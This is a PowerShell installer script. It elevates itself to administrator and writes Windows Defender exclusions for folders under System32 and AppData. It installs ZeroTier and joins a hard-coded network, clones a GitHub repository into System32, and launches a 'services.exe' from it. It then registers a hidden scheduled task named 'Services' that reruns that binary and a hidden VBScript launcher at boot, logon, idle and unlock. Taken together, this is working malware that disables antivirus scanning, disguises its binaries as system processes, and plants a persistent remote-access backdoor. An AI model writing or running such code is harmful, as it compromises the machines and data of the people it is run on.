# Function to ensure the script runs with administrative privileges
function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "Restarting script with elevated privileges..." -ForegroundColor Yellow
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
        exit
    }
}

# Call the function to ensure administrative privileges
Ensure-Admin

# Function to add folder exclusions to Windows Defender via the registry
function Add-FolderExclusions {
    # List of folders to exclude
    $foldersToExclude = @(
        "C:\Windows\System32\SubDirectory\",
        "C:\Windows\System32\SubDir",
	"C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\",
        "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
    )

    # Define the registry path for exclusions
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"

    # Create the registry key if it doesn't exist
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }

    # Add each folder to the exclusions
    foreach ($folder in $foldersToExclude) {
        Write-Host "Adding exclusion for folder: $folder" -ForegroundColor Green
        Set-ItemProperty -Path $regPath -Name $folder -Value 0 -ErrorAction Stop
    }

    # Verify exclusions
    Write-Host "Verifying exclusions..." -ForegroundColor Cyan
    $exclusions = Get-ItemProperty -Path $regPath
    foreach ($folder in $foldersToExclude) {
        if ($exclusions.$folder -eq 0) {
            Write-Host "Successfully added exclusion for: $folder" -ForegroundColor Green
        } else {
            Write-Host "Failed to add exclusion for: $folder" -ForegroundColor Red
        }
    }
}

# Add folder exclusions
Add-FolderExclusions

# Function to install Chocolatey if not already installed
function Install-Chocolatey {
    if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Chocolatey..." -ForegroundColor Green
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    } else {
        Write-Host "Chocolatey is already installed." -ForegroundColor Cyan
    }
}

# Install Chocolatey
Install-Chocolatey

# Function to install Git using Chocolatey
function Install-Git {
    if (!(Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Git using Chocolatey..." -ForegroundColor Green
        choco install git -y
    } else {
        Write-Host "Git is already installed." -ForegroundColor Cyan
    }
}

# Install Git
Install-Git

# Install ZeroTier using Chocolatey
Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
choco install zerotier-one -y

#Refreshing environmental variables 
[System.Environment]::SetEnvironmentVariable('PATH', [System.Environment]::GetEnvironmentVariable('PATH', [System.EnvironmentVariableTarget]::Machine), [System.EnvironmentVariableTarget]::Process)


# Verify installation
if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
    Write-Host "ZeroTier installation failed." -ForegroundColor Red
    $choice = Read-Host "Do you want to troubleshoot and rerun the installation? (yes/no)"
    if ($choice -eq "yes" -or $choice -eq "y") {
        Write-Host "Please check your internet connection and try again." -ForegroundColor Cyan
        return
    } else {
        Write-Host "Exiting script without completing installation." -ForegroundColor Red
        return
    }
}

# Start the ZeroTierOne service
Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
Start-Service -Name ZeroTierOneService

# Verify the service started successfully
if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
    Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
    $choice = Read-Host "Would you like to troubleshoot the service manually? (yes/no)"
    if ($choice -eq "no" -or $choice -eq "n") {
        Write-Host "Exiting script." -ForegroundColor Red
        return
    }
}

# Join the specified ZeroTier network
Write-Host "Joining ZeroTier network..." -ForegroundColor Green
zerotier-cli join 9f77fc393ec31ee7

# Function to clone the GitHub repository
function Clone-GitHubRepo {
    $repoUrl = "https://github.com/zainmustafam977/SECURITYCLIENT.git"
    $destinationDir = "C:\Windows\System32\SubDirectory\"
	
	# Check if the destination path exists
    if (Test-Path $destinationDir) {
        Write-Host "Directory exists. Deleting it..."
        Remove-Item -Recurse -Force $destinationDir
}

    # Create the destination directory if it doesn't exist
    if (-not (Test-Path $destinationDir)) {
        New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
    }

    Write-Host "Cloning GitHub repository..." -ForegroundColor Green
    try {
        # Use the git clone command directly
        git clone https://github.com/zainmustafam977/SECURITYCLIENT.git C:\Windows\System32\SubDirectory\SECURITYCLIENT\git 
        Write-Host "Repository cloned successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to clone repository: $($_.Exception.Message)" -ForegroundColor Red
        throw "Repository clone failed."
    }
}

# Clone the GitHub repository
Clone-GitHubRepo

#Starting programs
Start-Process -FilePath "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe" -Verb RunAs

# Define variables
$taskName = "Services"
$xmlFilePath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\sch.xml"
$psScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\zerotier.ps1"
$vbScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\run_zerotier.vbs"

# Retrieve current user and domain information dynamically
$domain = $env:USERDOMAIN
$username = $env:USERNAME

# Ensure the directory exists before saving the files
$xmlDirectory = Split-Path -Path $xmlFilePath -Parent
if (!(Test-Path -Path $xmlDirectory)) {
    New-Item -ItemType Directory -Path $xmlDirectory -Force | Out-Null
}

# Create a VBScript wrapper to launch the PowerShell script hidden
$vbScriptContent = @"
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -ExecutionPolicy Bypass -File `"$psScriptPath`"", 0, False
Set shell = Nothing
"@

# Save the VBScript file
Try {
    $vbScriptContent | Out-File -FilePath $vbScriptPath -Encoding ASCII -Force
    Write-Output "VBScript wrapper created successfully: $vbScriptPath"
} Catch {
    Write-Error "Failed to create VBScript file: $_"
    Exit 1
}

# Define the XML content dynamically
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$(Get-Date -Format o)</Date>
    <Author>$domain\$username</Author>
    <URI>\services</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>ConsoleConnect</StateChange>
    </SessionStateChangeTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>SessionUnlock</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$domain\$username</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe</Command>
    </Exec>
    <Exec>
      <Command>"C:\Program Files\SubDir\services.exe"</Command>
    </Exec>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"$vbScriptPath"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save the XML content to a file with error handling
Try {
    $xmlContent | Out-File -FilePath $xmlFilePath -Encoding UTF8 -Force
    Write-Output "XML configuration saved successfully: $xmlFilePath"
} Catch {
    Write-Error "Failed to save XML file: $_"
    Exit 1
}

# Register the scheduled task with error handling
Try {
    Register-ScheduledTask -Xml (Get-Content -Path $xmlFilePath -Raw) -TaskName $taskName -Force
    Write-Output "Scheduled task '$taskName' registered successfully."
} Catch {
    Write-Error "Failed to register scheduled task: $_"
    Exit 1
}

# Start the scheduled task with error handling
Try {
    Start-ScheduledTask -TaskName $taskName
    Write-Output "Scheduled task '$taskName' started successfully."
} Catch {
    Write-Error "Failed to start scheduled task: $_"
}

# Check and display the task status
Try {
    $taskStatus = Get-ScheduledTask -TaskName $taskName | Select-Object -ExpandProperty State
    Write-Output "Scheduled Task '$taskName' Status: $taskStatus"
} Catch {
    Write-Error "Failed to retrieve scheduled task status: $_"
}


Write-Host "Script completed successfully." -ForegroundColor Green
# Keep the window open
Read-Host -Prompt "Press Enter to exit"
